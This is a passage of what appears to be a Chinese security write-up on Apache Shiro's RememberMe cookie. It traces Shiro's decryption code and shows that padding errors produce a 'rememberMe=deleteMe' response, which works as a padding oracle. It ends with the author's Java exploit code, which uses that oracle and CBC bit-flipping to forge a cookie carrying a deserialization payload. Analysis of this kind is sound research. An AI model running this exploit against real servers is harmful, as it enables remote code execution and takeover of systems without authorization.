                int ivByteSize = ivSize / BITS_PER_BYTE;
                //now we know how large the iv is, so extract the iv bytes:
                iv = new byte[ivByteSize];
                System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);
                //remaining data is the actual encrypted ciphertext.  Isolate it:
                int encryptedSize = ciphertext.length - ivByteSize;
                encrypted = new byte[encryptedSize];
                System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
            } catch (Exception e) {
                String msg = "Unable to correctly extract the Initialization Vector or ciphertext.";
                throw new CryptoException(msg, e);
            }
        }
        return decrypt(encrypted, key, iv);
    }
->
    private byte[] crypt(byte[] bytes, byte[] key, byte[] iv, int mode) throws IllegalArgumentException, CryptoException {
        if (key == null || key.length == 0) {
            throw new IllegalArgumentException("key argument cannot be null or empty.");
        }
        javax.crypto.Cipher cipher = initNewCipher(mode, key, iv, false);
        return crypt(cipher, bytes);
    }
->
    private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException {
        try {
            return cipher.doFinal(bytes);
        } catch (Exception e) {
            String msg = "Unable to execute 'doFinal' with cipher instance [" + cipher + "].";
            throw new CryptoException(msg, e);
        }
    }
这个执行栈有点长，但最终执行到最后一步crypt()方法时，如果解密出现padding错误的话，就会直接抛出异常`throw new
CryptoException(msg,
e);`，一直向上，直到我们刚刚说的getRememberedPrincipals()方法，接着被try、catch捕获异常，由onRememberedPrincipalFailure()方法进行处理
跟进其方法发现，forgetIdentity()方法在当前的AbstractRememberMeManager类并没有实现
    protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
        if (log.isWarnEnabled()) {
            String message = "There was a failure while trying to retrieve remembered principals.  This could be due to a " +
                    "configuration problem or corrupted principals.  This could also be due to a recently " +
                    "changed encryption key, if you are using a shiro.ini file, this property would be " +
                    "'securityManager.rememberMeManager.cipherKey' see: http://shiro.apache.org/web.html#Web-RememberMeServices. " +
                    "The remembered identity will be forgotten and not used for this request.";
            log.warn(message);
        }
        forgetIdentity(context);
        //propagate - security manager implementation will handle and warn appropriately
        throw e;
    }
跟进其实现类org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)
    public void forgetIdentity(SubjectContext subjectContext) {
        if (WebUtils.isHttp(subjectContext)) {
            HttpServletRequest request = WebUtils.getHttpRequest(subjectContext);
            HttpServletResponse response = WebUtils.getHttpResponse(subjectContext);
            forgetIdentity(request, response);
        }
    }
    private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {
        getCookie().removeFrom(request, response);
    }
可以看到，最后调用的是rememberMe这个cookie对应的SimpleCookie对象的removeFrom()方法
    public static final String DELETED_COOKIE_VALUE = "deleteMe";
    public void removeFrom(HttpServletRequest request, HttpServletResponse response) {
        String name = getName();
        String value = DELETED_COOKIE_VALUE;
        String comment = null; //don't need to add extra size to the response - comments are irrelevant for deletions
        String domain = getDomain();
        String path = calculatePath(request);
        int maxAge = 0; //always zero for deletion
        int version = getVersion();
        boolean secure = isSecure();
        boolean httpOnly = false; //no need to add the extra text, plus the value 'deleteMe' is not sensitive at all
        SameSiteOptions sameSite = null;
        addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly, sameSite);
        log.trace("Removed '{}' cookie by setting maxAge=0", name);
    }
很简单，源码可以看出来，覆盖掉了rememberMe这个cookie的值为deleteMe
那么，答案就呼之欲出了，只要padding错误，服务端就会返回一个cookie: **rememberMe=deleteMe;**
那么，上面讲述了padding错误的返回特征后，那么padding正确的特征到底是如何呢？
因为java原生的反序列化，是按照约定的格式读取序列化数据，一步一步反序列化的，那么也就是说，我如果在序列化数据后面加入一些数据，是不会影响反序列化的，这里可以参考一下[《浅析Java序列化和反序列化》](https://xz.aliyun.com/t/3847)
那么，既然在序列化数据后面加上一段数据，不会影响反序列化，也就是说，我们可以利用一个已有的rememberMe
cookie值（AES加密的序列化数据），在其后加入一段数据，只要ASE能正确解密数据，就必然能被反序列化。
也就是说，在padding正常的情况下，反序列化能正常进行，web系统能知道我们的身份，在启用RememberMe，也就是配置了user的filter
chain的接口或页面，就能正常的返回数据。
为什么说 _配置了user的filter chain的接口或页面，就能正常的返回数据_ ？
我们回到最初的org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal处，在创建完成Subject后，我们说过，会执行一个filter
chain
    subject.execute(new Callable() {
        public Object call() throws Exception {
            updateSessionLastAccessTime(request, response);
            executeChain(request, response, chain);
            return null;
        }
    });
跟进其executeChain()方法
    protected void executeChain(ServletRequest request, ServletResponse response, FilterChain origChain)
            throws IOException, ServletException {
        FilterChain chain = getExecutionChain(request, response, origChain);
        chain.doFilter(request, response);
    }
其中比较关心的是getExecutionChain()方法，通过调用这个方法，返回了一个FilterChain，然后执行其doFilter()方法过滤请求
    protected FilterChain getExecutionChain(ServletRequest request, ServletResponse response, FilterChain origChain) {
        FilterChain chain = origChain;
        FilterChainResolver resolver = getFilterChainResolver();
        if (resolver == null) {
            log.debug("No FilterChainResolver configured.  Returning original FilterChain.");
            return origChain;
        }
        FilterChain resolved = resolver.getChain(request, response, origChain);
        if (resolved != null) {
            log.trace("Resolved a configured FilterChain for the current request.");
            chain = resolved;
        } else {
            log.trace("No FilterChain configured for the current request.  Using the default.");
        }
        return chain;
    }
到这里，我们应该隐约还有一些前面讲的内容的记忆吧？。。。没错，就是FilterChainResolver的实现PathMatchingFilterChainResolver，这里就是对其进行调用的地方了，通过调用其getChain()方法，找到相应的过滤器链执行过滤请求，那么，上面所说的user，对应的filter就是UserFilter
    public class UserFilter extends AccessControlFilter {
        /**
         * Returns true if the request is a
         * {@link #isLoginRequest(javax.servlet.ServletRequest, javax.servlet.ServletResponse) loginRequest} or
         * if the current {@link #getSubject(javax.servlet.ServletRequest, javax.servlet.ServletResponse) subject}
         * is not null, false otherwise.
         *
         * @return true if the request is a
         * {@link #isLoginRequest(javax.servlet.ServletRequest, javax.servlet.ServletResponse) loginRequest} or
         * if the current {@link #getSubject(javax.servlet.ServletRequest, javax.servlet.ServletResponse) subject}
         * is not null, false otherwise.
         */
        protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
            if (isLoginRequest(request, response)) {
                return true;
            } else {
                Subject subject = getSubject(request, response);
                // If principal is not null, then the user is known and should be allowed access.
                return subject.getPrincipal() != null;
            }
        }
        /**
         * This default implementation simply calls
         * {@link #saveRequestAndRedirectToLogin(javax.servlet.ServletRequest, javax.servlet.ServletResponse) saveRequestAndRedirectToLogin}
         * and then immediately returns false, thereby preventing the chain from continuing so the redirect may
         * execute.
         */
        protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
            saveRequestAndRedirectToLogin(request, response);
            return false;
        }
    }
重点在isAccessAllowed()方法，判断了请求是否是登录请求，若是，则直接通过，否则会从上下文中取出前面创建的Subject，其中含有前面反序列化rememberMe解密数据得到的PrincipalCollection，也就是说，只要能正常反序列化成功，那么这里就会直接通过。
从这里我们就可以知道，我们为什么需要一个配置为user的接口或者页面了。
好了，两个最重要的条件就出来了：
  1. padding失败，返回一个cookie: **rememberMe=deleteMe;**
  2. padding成功，返回正常的响应数据
如果我们要进行padding oracle攻击，那我们只要判断响应头是否包含有cookie: **rememberMe=deleteMe;**
，就能确定padding是否正常了。
那padding oracle究竟如何去实现呢？这里我推荐p0's师傅的文章[《Shiro Padding Oracle Attack
反序列化》](https://p0sec.net/index.php/archives/126/)
我这里也自己手撸了一个Java版的shiro padding oracle cbc attack
exploits，放在marshalsec，大家可以参考一下，
熟悉Java代码的，很容易能看出来，下面的代码，每一轮padding爆破是把一个data数据拼接到原有的rememberMe
cookie，然后请求web服务端，根据其响应做出判断
    private void attack(byte[] bytes) {
    byte[] originRememberMe = Base64.getDecoder().decode(rememberMe.getBytes());
    CBCResult cbcResult = PaddingOracleCBCForShiro
        .paddingOracleCBC(bytes, data -> {
          try {
            byte[] newRememberMe = new byte[originRememberMe.length + data.length];
            System.arraycopy(originRememberMe, 0, newRememberMe, 0, originRememberMe.length);
            System.arraycopy(data, 0, newRememberMe, originRememberMe.length, data.length);
            return request(newRememberMe);
          } catch (Exception e) {
            e.printStackTrace();
          }
          return false;
        });
    byte[] remenberMe = new byte[cbcResult.getIv().length + cbcResult.getCrypt().length];
    System.arraycopy(cbcResult.getIv(), 0, remenberMe, 0, cbcResult.getIv().length);
    System.arraycopy(cbcResult.getCrypt(), 0, remenberMe, cbcResult.getIv().length,
        cbcResult.getCrypt().length);
    System.out.println("remenberMe=" + Base64.getEncoder().encodeToString(remenberMe));
    request(remenberMe);
    }
而下面的代码，就是像荐p0's师傅文章所说的，不断用两个block，去padding
oracle，得到middle后，接着进行cbc翻转攻击，把我们预期要解密出cbcResBytes，也就是一个序列化的攻击payload，一段段的利用cbc翻转，得到相应的密文，接着存储到res这个数值，在全部都遍历攻击完毕后，通过CBCResult这个对象返回
    public static CBCResult paddingOracleCBC(byte[] cbcResBytes,
          Predicate predicate) {
        //填充期望结果长度为16字节的倍数
        cbcResBytes = padding(cbcResBytes);
        System.out.println("[payload-length]:" + cbcResBytes.length);
        //该值为期望结果的组数-1，用于不断反向取出每组期望值去CBC攻击
        int cbcResGroup = cbcResBytes.length / 16;
        byte[] res = new byte[cbcResBytes.length];
        byte[] iv = new byte[16];
        byte[] crypt = new byte[16];
        int paddingLen = 0;
        for (; cbcResGroup > 0; cbcResGroup--) {
          System.out.println("[padding-length]:" + (paddingLen+=16) + "/" + cbcResBytes.length);
          byte[] middle = paddingOracle(iv, crypt, predicate);
          byte[] plain = generatePlain(iv, middle);
          byte[] plainTmp = Arrays.copyOf(plain, plain.length);
          plainTmp = unpadding(plainTmp);
          System.out.println("[plain]:" + new String(plainTmp));
          byte[] cbcResTmp = Arrays.copyOfRange(cbcResBytes, (cbcResGroup - 1) * 16, cbcResGroup * 16);
          //构造新的iv，cbc攻击
          byte[] ivBytesNew = cbcAttack(iv, cbcResTmp, plain);
          System.out.println("[cbc->plain]:" + new String(generatePlain(ivBytesNew, middle)));
          System.arraycopy(crypt, 0, res, (cbcResGroup - 1) * 16, 16);
          crypt = ivBytesNew;
          iv = new byte[iv.length];
        }
        return new CBCResult(crypt, res);
    }
### 参考
我对Padding Oracle攻击的分析和思考（详细）：
Shiro Padding Oracle Attack 反序列化：
浅析Java序列化和反序列化：
marshalsec：